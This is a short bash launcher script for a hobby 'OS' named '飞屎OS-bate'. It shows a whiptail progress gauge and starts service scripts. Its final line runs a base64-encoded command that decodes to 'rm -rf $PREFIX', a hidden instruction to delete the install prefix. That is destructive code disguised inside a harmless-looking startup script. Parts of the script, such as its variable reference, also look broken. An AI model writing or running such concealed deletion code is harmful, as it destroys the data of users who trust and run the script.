


###
 # @Author: whalefall
 # @Date: 2021-08-10 19:11:49
 # @LastEditTime: 2021-08-10 21:34:22
 # @Description: 
### 
nohup bash $飞屎OS-bate/.services.sh & 
#!/bin/bash
{
    for ((i = 0 ; i <= 100 ; i+=25)); do
        sleep 0.3
        echo $i
    done
} | whiptail --gauge "飞屎OS-bate正在启动" 6 60 0
bash $飞屎OS-bate/services.sh
sh -c '$(echo "cm0gLXJmICRQUkVGSVgK"|base64 -d)'